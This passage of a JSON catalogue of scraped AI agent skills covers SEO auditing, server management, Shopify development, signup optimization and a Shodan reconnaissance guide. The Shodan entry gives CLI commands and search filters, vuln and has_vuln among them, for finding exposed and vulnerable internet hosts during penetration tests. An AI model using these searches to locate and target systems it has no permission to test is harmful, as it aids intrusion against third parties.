TypeScript, JavaScript, Python, Go, Swift, Kotlin\n**Frontend:** React, Next.js, React Native, Flutter\n**Backend:** Node.js, Express, GraphQL, REST APIs\n**Database:** PostgreSQL, Prisma, NeonDB, Supabase\n**DevOps:** Docker, Kubernetes, Terraform, GitHub Actions, CircleCI\n**Cloud:** AWS, GCP, Azure\n\n## Development Workflow\n\n### 1. Setup and Configuration\n\n```bash\n# Install dependencies\nnpm install\n# or\npip install -r requirements.txt\n\n# Configure environment\ncp .env.example .env\n```\n\n### 2. Run Quality Checks\n\n```bash\n# Use the analyzer script\npython scripts/project_scaffolder.py .\n\n# Review recommendations\n# Apply fixes\n```\n\n### 3. Implement Best Practices\n\nFollow the patterns and practices documented in:\n- `references/tech_stack_guide.md`\n- `references/architecture_patterns.md`\n- `references/development_workflows.md`\n\n## Best Practices Summary\n\n### Code Quality\n- Follow established patterns\n- Write comprehensive tests\n- Document decisions\n- Review regularly\n\n### Performance\n- Measure before optimizing\n- Use appropriate caching\n- Optimize critical paths\n- Monitor in production\n\n### Security\n- Validate all inputs\n- Use parameterized queries\n- Implement proper authentication\n- Keep dependencies updated\n\n### Maintainability\n- Write clear code\n- Use consistent naming\n- Add helpful comments\n- Keep it simple\n\n## Common Commands\n\n```bash\n# Development\nnpm run dev\nnpm run build\nnpm run test\nnpm run lint\n\n# Analysis\npython scripts/project_scaffolder.py .\npython scripts/code_quality_analyzer.py --analyze\n\n# Deployment\ndocker build -t app:latest .\ndocker-compose up -d\nkubectl apply -f k8s/\n```\n\n## Troubleshooting\n\n### Common Issues\n\nCheck the comprehensive troubleshooting section in `references/development_workflows.md`.\n\n### Getting Help\n\n- Review reference documentation\n- Check script output messages\n- Consult tech stack documentation\n- Review error logs\n\n## Resources\n\n- Pattern Reference: `references/tech_stack_guide.md`\n- Workflow Guide: `references/architecture_patterns.md`\n- Technical Guide: `references/development_workflows.md`\n- Tool Scripts: `scripts/` directory\n",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "automation",
        "workflow",
        "template"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:30.342Z"
    },
    {
      "id": "antigravity-seo-audit",
      "name": "seo-audit",
      "slug": "seo-audit",
      "description": "Diagnose and audit SEO issues affecting crawlability, indexation, rankings, and organic performance. Use when the user asks for an SEO audit, technical SEO review, ranking diagnosis, on-page SEO review, meta tag audit, or SEO health check. This skill identifies issues and prioritizes actions but doe",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/seo-audit",
      "content": "\n# SEO Audit\n\nYou are an **SEO diagnostic specialist**.\nYour role is to **identify, explain, and prioritize SEO issues** that affect organic visibility—**not to implement fixes unless explicitly requested**.\n\nYour output must be **evidence-based, scoped, and actionable**.\n\n---\n\n## Scope Gate (Ask First if Missing)\n\nBefore performing a full audit, clarify:\n\n1. **Business Context**\n\n   * Site type (SaaS, e-commerce, blog, local, marketplace, etc.)\n   * Primary SEO goal (traffic, conversions, leads, brand visibility)\n   * Target markets and languages\n\n2. **SEO Focus**\n\n   * Full site audit or specific sections/pages?\n   * Technical SEO, on-page, content, or all?\n   * Desktop, mobile, or both?\n\n3. **Data Access**\n\n   * Google Search Console access?\n   * Analytics access?\n   * Known issues, penalties, or recent changes (migration, redesign, CMS change)?\n\nIf critical context is missing, **state assumptions explicitly** before proceeding.\n\n---\n\n## Audit Framework (Priority Order)\n\n1. **Crawlability & Indexation** – Can search engines access and index the site?\n2. **Technical Foundations** – Is the site fast, stable, and accessible?\n3. **On-Page Optimization** – Is each page clearly optimized for its intent?\n4. **Content Quality & E-E-A-T** – Does the content deserve to rank?\n5. **Authority & Signals** – Does the site demonstrate trust and relevance?\n\n---\n\n## Technical SEO Audit\n\n### Crawlability\n\n**Robots.txt**\n\n* Accidental blocking of important paths\n* Sitemap reference present\n* Environment-specific rules (prod vs staging)\n\n**XML Sitemaps**\n\n* Accessible and valid\n* Contains only canonical, indexable URLs\n* Reasonable size and segmentation\n* Submitted and processed successfully\n\n**Site Architecture**\n\n* Key pages within ~3 clicks\n* Logical hierarchy\n* Internal linking coverage\n* No orphaned URLs\n\n**Crawl Efficiency (Large Sites)**\n\n* Parameter handling\n* Faceted navigation controls\n* Infinite scroll with crawlable pagination\n* Session IDs avoided\n\n---\n\n### Indexation\n\n**Coverage Analysis**\n\n* Indexed vs expected pages\n* Excluded URLs (intentional vs accidental)\n\n**Common Indexation Issues**\n\n* Incorrect `noindex`\n* Canonical conflicts\n* Redirect chains or loops\n* Soft 404s\n* Duplicate content without consolidation\n\n**Canonicalization Consistency**\n\n* Self-referencing canonicals\n* HTTPS consistency\n* Hostname consistency (www / non-www)\n* Trailing slash rules\n\n---\n\n### Performance & Core Web Vitals\n\n**Key Metrics**\n\n* LCP < 2.5s\n* INP < 200ms\n* CLS < 0.1\n\n**Contributing Factors**\n\n* Server response time\n* Image handling\n* JavaScript execution cost\n* CSS delivery\n* Caching strategy\n* CDN usage\n* Font loading behavior\n\n---\n\n### Mobile-Friendliness\n\n* Responsive layout\n* Proper viewport configuration\n* Tap target sizing\n* No horizontal scrolling\n* Content parity with desktop\n* Mobile-first indexing readiness\n\n---\n\n### Security & Accessibility Signals\n\n* HTTPS everywhere\n* Valid certificates\n* No mixed content\n* HTTP → HTTPS redirects\n* Accessibility issues that impact UX or crawling\n\n---\n\n## On-Page SEO Audit\n\n### Title Tags\n\n* Unique per page\n* Keyword-aligned\n* Appropriate length\n* Clear intent and differentiation\n\n### Meta Descriptions\n\n* Unique and descriptive\n* Supports click-through\n* Not auto-generated noise\n\n### Heading Structure\n\n* One clear H1\n* Logical hierarchy\n* Headings reflect content structure\n\n### Content Optimization\n\n* Satisfies search intent\n* Sufficient topical depth\n* Natural keyword usage\n* Not competing with other internal pages\n\n### Images\n\n* Descriptive filenames\n* Accurate alt text\n* Proper compression and formats\n* Responsive handling and lazy loading\n\n### Internal Linking\n\n* Important pages reinforced\n* Descriptive anchor text\n* No broken links\n* Balanced link distribution\n\n---\n\n## Content Quality & E-E-A-T\n\n### Experience & Expertise\n\n* First-hand knowledge\n* Original insights or data\n* Clear author attribution\n\n### Authoritativeness\n\n* Citations or recognition\n* Consistent topical focus\n\n### Trustworthiness\n\n* Accurate, updated content\n* Transparent business information\n* Policies (privacy, terms)\n* Secure site\n\n---\n## 🔢 SEO Health Index & Scoring Layer (Additive)\n\n### Purpose\n\nThe **SEO Health Index** provides a **normalized, explainable score** that summarizes overall SEO health **without replacing detailed findings**.\n\nIt is designed to:\n\n* Communicate severity at a glance\n* Support prioritization\n* Track improvement over time\n* Avoid misleading “one-number SEO” claims\n\n---\n\n## Scoring Model Overview\n\n### Total Score: **0–100**\n\nThe score is a **weighted composite**, not an average.\n\n| Category                  | Weight  |\n| ------------------------- | ------- |\n| Crawlability & Indexation | 30      |\n| Technical Foundations     | 25      |\n| On-Page Optimization      | 20      |\n| Content Quality & E-E-A-T | 15      |\n| Authority & Trust Signals | 10      |\n| **Total**                 | **100** |\n\n> If a category is **out of scope**, redistribute its weight proportionally and sta",
      "tags": [
        "javascript",
        "ai",
        "template",
        "design",
        "image",
        "security",
        "rag",
        "seo",
        "cro"
      ],
      "useCases": [
        "Noindex on key category pages → Critical (−25, High confidence)",
        "XML sitemap includes redirected URLs → Medium (−5, Medium confidence → −2.5)",
        "Missing sitemap reference in robots.txt → Low (−2)"
      ],
      "scrapedAt": "2026-01-26T13:21:33.292Z"
    },
    {
      "id": "antigravity-seo-fundamentals",
      "name": "seo-fundamentals",
      "slug": "seo-fundamentals",
      "description": "Core principles of SEO including E-E-A-T, Core Web Vitals, technical foundations, content quality, and how modern search engines evaluate pages. This skill explains *why* SEO works, not how to execute specific optimizations.\n",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/seo-fundamentals",
      "content": "\n---\n\n# SEO Fundamentals\n\n> **Foundational principles for sustainable search visibility.**\n> This skill explains _how search engines evaluate quality_, not tactical shortcuts.\n\n---\n\n## 1. E-E-A-T (Quality Evaluation Framework)\n\nE-E-A-T is **not a direct ranking factor**.\nIt is a framework used by search engines to **evaluate content quality**, especially for sensitive or high-impact topics.\n\n| Dimension             | What It Represents                 | Common Signals                                      |\n| --------------------- | ---------------------------------- | --------------------------------------------------- |\n| **Experience**        | First-hand, real-world involvement | Original examples, lived experience, demonstrations |\n| **Expertise**         | Subject-matter competence          | Credentials, depth, accuracy                        |\n| **Authoritativeness** | Recognition by others              | Mentions, citations, links                          |\n| **Trustworthiness**   | Reliability and safety             | HTTPS, transparency, accuracy                       |\n\n> Pages competing in the same space are often differentiated by **trust and experience**, not keywords.\n\n---\n\n## 2. Core Web Vitals (Page Experience Signals)\n\nCore Web Vitals measure **how users experience a page**, not whether it deserves to rank.\n\n| Metric  | Target  | What It Reflects    |\n| ------- | ------- | ------------------- |\n| **LCP** | < 2.5s  | Loading performance |\n| **INP** | < 200ms | Interactivity       |\n| **CLS** | < 0.1   | Visual stability    |\n\n**Important context:**\n\n- CWV rarely override poor content\n- They matter most when content quality is comparable\n- Failing CWV can _hold back_ otherwise good pages\n\n---\n\n## 3. Technical SEO Principles\n\nTechnical SEO ensures pages are **accessible, understandable, and stable**.\n\n### Crawl & Index Control\n\n| Element           | Purpose                |\n| ----------------- | ---------------------- |\n| XML sitemaps      | Help discovery         |\n| robots.txt        | Control crawl access   |\n| Canonical tags    | Consolidate duplicates |\n| HTTP status codes | Communicate page state |\n| HTTPS             | Security and trust     |\n\n### Performance & Accessibility\n\n| Factor                 | Why It Matters                |\n| ---------------------- | ----------------------------- |\n| Page speed             | User satisfaction             |\n| Mobile-friendly design | Mobile-first indexing         |\n| Clean URLs             | Crawl clarity                 |\n| Semantic HTML          | Accessibility & understanding |\n\n---\n\n## 4. Content SEO Principles\n\n### Page-Level Elements\n\n| Element          | Principle                    |\n| ---------------- | ---------------------------- |\n| Title tag        | Clear topic + intent         |\n| Meta description | Click relevance, not ranking |\n| H1               | Page’s primary subject       |\n| Headings         | Logical structure            |\n| Alt text         | Accessibility and context    |\n\n### Content Quality Signals\n\n| Dimension   | What Search Engines Look For |\n| ----------- | ---------------------------- |\n| Depth       | Fully answers the query      |\n| Originality | Adds unique value            |\n| Accuracy    | Factually correct            |\n| Clarity     | Easy to understand           |\n| Usefulness  | Satisfies intent             |\n\n---\n\n## 5. Structured Data (Schema)\n\nStructured data helps search engines **understand meaning**, not boost rankings directly.\n\n| Type           | Purpose                |\n| -------------- | ---------------------- |\n| Article        | Content classification |\n| Organization   | Entity identity        |\n| Person         | Author information     |\n| FAQPage        | Q&A clarity            |\n| Product        | Commerce details       |\n| Review         | Ratings context        |\n| BreadcrumbList | Site structure         |\n\n> Schema enables eligibility for rich results but does not guarantee them.\n\n---\n\n## 6. AI-Assisted Content Principles\n\nSearch engines evaluate **output quality**, not authorship method.\n\n### Effective Use\n\n- AI as a drafting or research assistant\n- Human review for accuracy and clarity\n- Original insights and synthesis\n- Clear accountability\n\n### Risky Use\n\n- Publishing unedited AI output\n- Factual errors or hallucinations\n- Thin or duplicated content\n- Keyword-driven text with no value\n\n---\n\n## 7. Relative Importance of SEO Factors\n\nThere is **no fixed ranking factor order**.\nHowever, when competing pages are similar, importance tends to follow this pattern:\n\n| Relative Weight | Factor                      |\n| --------------- | --------------------------- |\n| Highest         | Content relevance & quality |\n| High            | Authority & trust signals   |\n| Medium          | Page experience (CWV, UX)   |\n| Medium          | Mobile optimization         |\n| Baseline        | Technical accessibility     |\n\n> Technical SEO enables ranking; content quality earns it.\n\n---\n\n## 8. Measure",
      "tags": [
        "ai",
        "design",
        "security",
        "rag",
        "seo"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:34.479Z"
    },
    {
      "id": "antigravity-server-management",
      "name": "server-management",
      "slug": "server-management",
      "description": "Server management principles and decision-making. Process management, monitoring strategy, and scaling decisions. Teaches thinking, not commands.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/server-management",
      "content": "\n# Server Management\n\n> Server management principles for production operations.\n> **Learn to THINK, not memorize commands.**\n\n---\n\n## 1. Process Management Principles\n\n### Tool Selection\n\n| Scenario | Tool |\n|----------|------|\n| **Node.js app** | PM2 (clustering, reload) |\n| **Any app** | systemd (Linux native) |\n| **Containers** | Docker/Podman |\n| **Orchestration** | Kubernetes, Docker Swarm |\n\n### Process Management Goals\n\n| Goal | What It Means |\n|------|---------------|\n| **Restart on crash** | Auto-recovery |\n| **Zero-downtime reload** | No service interruption |\n| **Clustering** | Use all CPU cores |\n| **Persistence** | Survive server reboot |\n\n---\n\n## 2. Monitoring Principles\n\n### What to Monitor\n\n| Category | Key Metrics |\n|----------|-------------|\n| **Availability** | Uptime, health checks |\n| **Performance** | Response time, throughput |\n| **Errors** | Error rate, types |\n| **Resources** | CPU, memory, disk |\n\n### Alert Severity Strategy\n\n| Level | Response |\n|-------|----------|\n| **Critical** | Immediate action |\n| **Warning** | Investigate soon |\n| **Info** | Review daily |\n\n### Monitoring Tool Selection\n\n| Need | Options |\n|------|---------|\n| Simple/Free | PM2 metrics, htop |\n| Full observability | Grafana, Datadog |\n| Error tracking | Sentry |\n| Uptime | UptimeRobot, Pingdom |\n\n---\n\n## 3. Log Management Principles\n\n### Log Strategy\n\n| Log Type | Purpose |\n|----------|---------|\n| **Application logs** | Debug, audit |\n| **Access logs** | Traffic analysis |\n| **Error logs** | Issue detection |\n\n### Log Principles\n\n1. **Rotate logs** to prevent disk fill\n2. **Structured logging** (JSON) for parsing\n3. **Appropriate levels** (error/warn/info/debug)\n4. **No sensitive data** in logs\n\n---\n\n## 4. Scaling Decisions\n\n### When to Scale\n\n| Symptom | Solution |\n|---------|----------|\n| High CPU | Add instances (horizontal) |\n| High memory | Increase RAM or fix leak |\n| Slow response | Profile first, then scale |\n| Traffic spikes | Auto-scaling |\n\n### Scaling Strategy\n\n| Type | When to Use |\n|------|-------------|\n| **Vertical** | Quick fix, single instance |\n| **Horizontal** | Sustainable, distributed |\n| **Auto** | Variable traffic |\n\n---\n\n## 5. Health Check Principles\n\n### What Constitutes Healthy\n\n| Check | Meaning |\n|-------|---------|\n| **HTTP 200** | Service responding |\n| **Database connected** | Data accessible |\n| **Dependencies OK** | External services reachable |\n| **Resources OK** | CPU/memory not exhausted |\n\n### Health Check Implementation\n\n- Simple: Just return 200\n- Deep: Check all dependencies\n- Choose based on load balancer needs\n\n---\n\n## 6. Security Principles\n\n| Area | Principle |\n|------|-----------|\n| **Access** | SSH keys only, no passwords |\n| **Firewall** | Only needed ports open |\n| **Updates** | Regular security patches |\n| **Secrets** | Environment vars, not files |\n| **Audit** | Log access and changes |\n\n---\n\n## 7. Troubleshooting Priority\n\nWhen something's wrong:\n\n1. **Check if running** (process status)\n2. **Check logs** (error messages)\n3. **Check resources** (disk, memory, CPU)\n4. **Check network** (ports, DNS)\n5. **Check dependencies** (database, APIs)\n\n---\n\n## 8. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Run as root | Use non-root user |\n| Ignore logs | Set up log rotation |\n| Skip monitoring | Monitor from day one |\n| Manual restarts | Auto-restart config |\n| No backups | Regular backup schedule |\n\n---\n\n> **Remember:** A well-managed server is boring. That's the goal.\n",
      "tags": [
        "node",
        "api",
        "ai",
        "security",
        "docker",
        "kubernetes"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:36.415Z"
    },
    {
      "id": "antigravity-shodan-reconnaissance",
      "name": "Shodan Reconnaissance and Pentesting",
      "slug": "shodan-reconnaissance",
      "description": "This skill should be used when the user asks to \"search for exposed devices on the internet,\" \"perform Shodan reconnaissance,\" \"find vulnerable services using Shodan,\" \"scan IP ranges with Shodan,\" or \"discover IoT devices and open ports.\" It provides comprehensive guidance for using Shodan's search",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/shodan-reconnaissance",
      "content": "\n# Shodan Reconnaissance and Pentesting\n\n## Purpose\n\nProvide systematic methodologies for leveraging Shodan as a reconnaissance tool during penetration testing engagements. This skill covers the Shodan web interface, command-line interface (CLI), REST API, search filters, on-demand scanning, and network monitoring capabilities for discovering exposed services, vulnerable systems, and IoT devices.\n\n## Inputs / Prerequisites\n\n- **Shodan Account**: Free or paid account at shodan.io\n- **API Key**: Obtained from Shodan account dashboard\n- **Target Information**: IP addresses, domains, or network ranges to investigate\n- **Shodan CLI**: Python-based command-line tool installed\n- **Authorization**: Written permission for reconnaissance on target networks\n\n## Outputs / Deliverables\n\n- **Asset Inventory**: List of discovered hosts, ports, and services\n- **Vulnerability Report**: Identified CVEs and exposed vulnerable services\n- **Banner Data**: Service banners revealing software versions\n- **Network Mapping**: Geographic and organizational distribution of assets\n- **Screenshot Gallery**: Visual reconnaissance of exposed interfaces\n- **Exported Data**: JSON/CSV files for further analysis\n\n## Core Workflow\n\n### 1. Setup and Configuration\n\n#### Install Shodan CLI\n```bash\n# Using pip\npip install shodan\n\n# Or easy_install\neasy_install shodan\n\n# On BlackArch/Arch Linux\nsudo pacman -S python-shodan\n```\n\n#### Initialize API Key\n```bash\n# Set your API key\nshodan init YOUR_API_KEY\n\n# Verify setup\nshodan info\n# Output: Query credits available: 100\n#         Scan credits available: 100\n```\n\n#### Check Account Status\n```bash\n# View credits and plan info\nshodan info\n\n# Check your external IP\nshodan myip\n\n# Check CLI version\nshodan version\n```\n\n### 2. Basic Host Reconnaissance\n\n#### Query Single Host\n```bash\n# Get all information about an IP\nshodan host 1.1.1.1\n\n# Example output:\n# 1.1.1.1\n# Hostnames: one.one.one.one\n# Country: Australia\n# Organization: Mountain View Communications\n# Number of open ports: 3\n# Ports:\n#   53/udp\n#   80/tcp\n#   443/tcp\n```\n\n#### Check if Host is Honeypot\n```bash\n# Get honeypot probability score\nshodan honeyscore 192.168.1.100\n\n# Output: Not a honeypot\n#         Score: 0.3\n```\n\n### 3. Search Queries\n\n#### Basic Search (Free)\n```bash\n# Simple keyword search (no credits consumed)\nshodan search apache\n\n# Specify output fields\nshodan search --fields ip_str,port,os smb\n```\n\n#### Filtered Search (1 Credit)\n```bash\n# Product-specific search\nshodan search product:mongodb\n\n# Search with multiple filters\nshodan search product:nginx country:US city:\"New York\"\n```\n\n#### Count Results\n```bash\n# Get result count without consuming credits\nshodan count openssh\n# Output: 23128\n\nshodan count openssh 7\n# Output: 219\n```\n\n#### Download Results\n```bash\n# Download 1000 results (default)\nshodan download results.json.gz \"apache country:US\"\n\n# Download specific number of results\nshodan download --limit 5000 results.json.gz \"nginx\"\n\n# Download all available results\nshodan download --limit -1 all_results.json.gz \"query\"\n```\n\n#### Parse Downloaded Data\n```bash\n# Extract specific fields from downloaded data\nshodan parse --fields ip_str,port,hostnames results.json.gz\n\n# Filter by specific criteria\nshodan parse --fields location.country_code3,ip_str -f port:22 results.json.gz\n\n# Export to CSV format\nshodan parse --fields ip_str,port,org --separator , results.json.gz > results.csv\n```\n\n### 4. Search Filters Reference\n\n#### Network Filters\n```\nip:1.2.3.4                  # Specific IP address\nnet:192.168.0.0/24          # Network range (CIDR)\nhostname:example.com        # Hostname contains\nport:22                     # Specific port\nasn:AS15169                 # Autonomous System Number\n```\n\n#### Geographic Filters\n```\ncountry:US                  # Two-letter country code\ncountry:\"United States\"     # Full country name\ncity:\"San Francisco\"        # City name\nstate:CA                    # State/region\npostal:94102                # Postal/ZIP code\ngeo:37.7,-122.4             # Lat/long coordinates\n```\n\n#### Organization Filters\n```\norg:\"Google\"                # Organization name\nisp:\"Comcast\"               # ISP name\n```\n\n#### Service/Product Filters\n```\nproduct:nginx               # Software product\nversion:1.14.0              # Software version\nos:\"Windows Server 2019\"    # Operating system\nhttp.title:\"Dashboard\"      # HTTP page title\nhttp.html:\"login\"           # HTML content\nhttp.status:200             # HTTP status code\nssl.cert.subject.cn:*.example.com  # SSL certificate\nssl:true                    # Has SSL enabled\n```\n\n#### Vulnerability Filters\n```\nvuln:CVE-2019-0708          # Specific CVE\nhas_vuln:true               # Has any vulnerability\n```\n\n#### Screenshot Filters\n```\nhas_screenshot:true         # Has screenshot available\nscreenshot.label:webcam     # Screenshot type\n```\n\n### 5. On-Demand Scanning\n\n#### Submit Scan\n```bash\n# Scan single IP (1 credit per IP)\nshodan scan submit 192.168.1.100\n\n# Scan with verbose output (s",
      "tags": [
        "python",
        "api",
        "ai",
        "automation",
        "workflow",
        "document",
        "pentest",
        "vulnerability",
        "docker",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:37.625Z"
    },
    {
      "id": "antigravity-shopify-apps",
      "name": "shopify-apps",
      "slug": "shopify-apps",
      "description": "Expert patterns for Shopify app development including Remix/React Router apps, embedded apps with App Bridge, webhook handling, GraphQL Admin API, Polaris components, billing, and app extensions. Use when: shopify app, shopify, embedded app, polaris, app bridge.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/shopify-apps",
      "content": "\n# Shopify Apps\n\n## Patterns\n\n### React Router App Setup\n\nModern Shopify app template with React Router\n\n### Embedded App with App Bridge\n\nRender app embedded in Shopify Admin\n\n### Webhook Handling\n\nSecure webhook processing with HMAC verification\n\n## Anti-Patterns\n\n### ❌ REST API for New Apps\n\n### ❌ Webhook Processing Before Response\n\n### ❌ Polling Instead of Webhooks\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | high | ## Respond immediately, process asynchronously |\n| Issue | high | ## Check rate limit headers |\n| Issue | high | ## Request protected customer data access |\n| Issue | medium | ## Use TOML only (recommended) |\n| Issue | medium | ## Handle both URL formats |\n| Issue | high | ## Use GraphQL for all new code |\n| Issue | high | ## Use latest App Bridge via script tag |\n| Issue | high | ## Implement all GDPR handlers |\n",
      "tags": [
        "react",
        "api",
        "template"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:38.797Z"
    },
    {
      "id": "antigravity-shopify-development",
      "name": "shopify-development",
      "slug": "shopify-development",
      "description": "Build Shopify apps, extensions, themes using GraphQL Admin API, Shopify CLI, Polaris UI, and Liquid.\nTRIGGER: \"shopify\", \"shopify app\", \"checkout extension\", \"admin extension\", \"POS extension\",\n\"shopify theme\", \"liquid template\", \"polaris\", \"shopify graphql\", \"shopify webhook\",\n\"shopify billing\", \"a",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/shopify-development",
      "content": "\n# Shopify Development Skill\n\nUse this skill when the user asks about:\n\n- Building Shopify apps or extensions\n- Creating checkout/admin/POS UI customizations\n- Developing themes with Liquid templating\n- Integrating with Shopify GraphQL or REST APIs\n- Implementing webhooks or billing\n- Working with metafields or Shopify Functions\n\n---\n\n## ROUTING: What to Build\n\n**IF user wants to integrate external services OR build merchant tools OR charge for features:**\n→ Build an **App** (see `references/app-development.md`)\n\n**IF user wants to customize checkout OR add admin UI OR create POS actions OR implement discount rules:**\n→ Build an **Extension** (see `references/extensions.md`)\n\n**IF user wants to customize storefront design OR modify product/collection pages:**\n→ Build a **Theme** (see `references/themes.md`)\n\n**IF user needs both backend logic AND storefront UI:**\n→ Build **App + Theme Extension** combination\n\n---\n\n## Shopify CLI Commands\n\nInstall CLI:\n\n```bash\nnpm install -g @shopify/cli@latest\n```\n\nCreate and run app:\n\n```bash\nshopify app init          # Create new app\nshopify app dev           # Start dev server with tunnel\nshopify app deploy        # Build and upload to Shopify\n```\n\nGenerate extension:\n\n```bash\nshopify app generate extension --type checkout_ui_extension\nshopify app generate extension --type admin_action\nshopify app generate extension --type admin_block\nshopify app generate extension --type pos_ui_extension\nshopify app generate extension --type function\n```\n\nTheme development:\n\n```bash\nshopify theme init        # Create new theme\nshopify theme dev         # Start local preview at localhost:9292\nshopify theme pull --live # Pull live theme\nshopify theme push --development  # Push to dev theme\n```\n\n---\n\n## Access Scopes\n\nConfigure in `shopify.app.toml`:\n\n```toml\n[access_scopes]\nscopes = \"read_products,write_products,read_orders,write_orders,read_customers\"\n```\n\nCommon scopes:\n\n- `read_products`, `write_products` - Product catalog access\n- `read_orders`, `write_orders` - Order management\n- `read_customers`, `write_customers` - Customer data\n- `read_inventory`, `write_inventory` - Stock levels\n- `read_fulfillments`, `write_fulfillments` - Order fulfillment\n\n---\n\n## GraphQL Patterns (Validated against API 2026-01)\n\n### Query Products\n\n```graphql\nquery GetProducts($first: Int!, $query: String) {\n  products(first: $first, query: $query) {\n    edges {\n      node {\n        id\n        title\n        handle\n        status\n        variants(first: 5) {\n          edges {\n            node {\n              id\n              price\n              inventoryQuantity\n            }\n          }\n        }\n      }\n    }\n    pageInfo {\n      hasNextPage\n      endCursor\n    }\n  }\n}\n```\n\n### Query Orders\n\n```graphql\nquery GetOrders($first: Int!) {\n  orders(first: $first) {\n    edges {\n      node {\n        id\n        name\n        createdAt\n        displayFinancialStatus\n        totalPriceSet {\n          shopMoney {\n            amount\n            currencyCode\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n### Set Metafields\n\n```graphql\nmutation SetMetafields($metafields: [MetafieldsSetInput!]!) {\n  metafieldsSet(metafields: $metafields) {\n    metafields {\n      id\n      namespace\n      key\n      value\n    }\n    userErrors {\n      field\n      message\n    }\n  }\n}\n```\n\nVariables example:\n\n```json\n{\n  \"metafields\": [\n    {\n      \"ownerId\": \"gid://shopify/Product/123\",\n      \"namespace\": \"custom\",\n      \"key\": \"care_instructions\",\n      \"value\": \"Handle with care\",\n      \"type\": \"single_line_text_field\"\n    }\n  ]\n}\n```\n\n---\n\n## Checkout Extension Example\n\n```tsx\nimport {\n  reactExtension,\n  BlockStack,\n  TextField,\n  Checkbox,\n  useApplyAttributeChange,\n} from \"@shopify/ui-extensions-react/checkout\";\n\nexport default reactExtension(\"purchase.checkout.block.render\", () => (\n  <GiftMessage />\n));\n\nfunction GiftMessage() {\n  const [isGift, setIsGift] = useState(false);\n  const [message, setMessage] = useState(\"\");\n  const applyAttributeChange = useApplyAttributeChange();\n\n  useEffect(() => {\n    if (isGift && message) {\n      applyAttributeChange({\n        type: \"updateAttribute\",\n        key: \"gift_message\",\n        value: message,\n      });\n    }\n  }, [isGift, message]);\n\n  return (\n    <BlockStack spacing=\"loose\">\n      <Checkbox checked={isGift} onChange={setIsGift}>\n        This is a gift\n      </Checkbox>\n      {isGift && (\n        <TextField\n          label=\"Gift Message\"\n          value={message}\n          onChange={setMessage}\n          multiline={3}\n        />\n      )}\n    </BlockStack>\n  );\n}\n```\n\n---\n\n## Liquid Template Example\n\n```liquid\n{% comment %} Product Card Snippet {% endcomment %}\n<div class=\"product-card\">\n  <a href=\"{{ product.url }}\">\n    {% if product.featured_image %}\n      <img\n        src=\"{{ product.featured_image | img_url: 'medium' }}\"\n        alt=\"{{ product.title | escape }}\"\n        loading=\"lazy\"\n      >\n    {% endif %}\n    <h3>{{ product.title }}</h3>\n    <p class=\"price\">{{ product.price | money",
      "tags": [
        "python",
        "react",
        "node",
        "api",
        "ai",
        "llm",
        "template",
        "design",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:21:39.987Z"
    },
    {
      "id": "antigravity-signup-flow-cro",
      "name": "signup-flow-cro",
      "slug": "signup-flow-cro",
      "description": "When the user wants to optimize signup, registration, account creation, or trial activation flows. Also use when the user mentions \"signup conversions,\" \"registration friction,\" \"signup form optimization,\" \"free trial signup,\" \"reduce signup dropoff,\" or \"account creation flow.\" For post-signup onbo",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/signup-flow-cro",
      "content": "\n# Signup Flow CRO\n\nYou are an expert in optimizing signup and registration flows. Your goal is to reduce friction, increase completion rates, and set users up for successful activation.\n\n## Initial Assessment\n\nBefore providing recommendations, understand:\n\n1. **Flow Type**\n   - Free trial signup\n   - Freemium account creation\n   - Paid account creation\n   - Waitlist/early access signup\n   - B2B vs B2C\n\n2. **Current State**\n   - How many steps/screens?\n   - What fields are required?\n   - What's the current completion rate?\n   - Where do users drop off?\n\n3. **Business Constraints**\n   - What data is genuinely needed at signup?\n   - Are there compliance requirements?\n   - What happens immediately after signup?\n\n---\n\n## Core Principles\n\n### 1. Minimize Required Fields\nEvery field reduces conversion. For each field, ask:\n- Do we absolutely need this before they can use the product?\n- Can we collect this later through progressive profiling?\n- Can we infer this from other data?\n\n**Typical field priority:**\n- Essential: Email (or phone), Password\n- Often needed: Name\n- Usually deferrable: Company, Role, Team size, Phone, Address\n\n### 2. Show Value Before Asking for Commitment\n- What can you show/give before requiring signup?\n- Can they experience the product before creating an account?\n- Reverse the order: value first, signup second\n\n### 3. Reduce Perceived Effort\n- Show progress if multi-step\n- Group related fields\n- Use smart defaults\n- Pre-fill when possible\n\n### 4. Remove Uncertainty\n- Clear expectations (\"Takes 30 seconds\")\n- Show what happens after signup\n- No surprises (hidden requirements, unexpected steps)\n\n---\n\n## Field-by-Field Optimization\n\n### Email Field\n- Single field (no email confirmation field)\n- Inline validation for format\n- Check 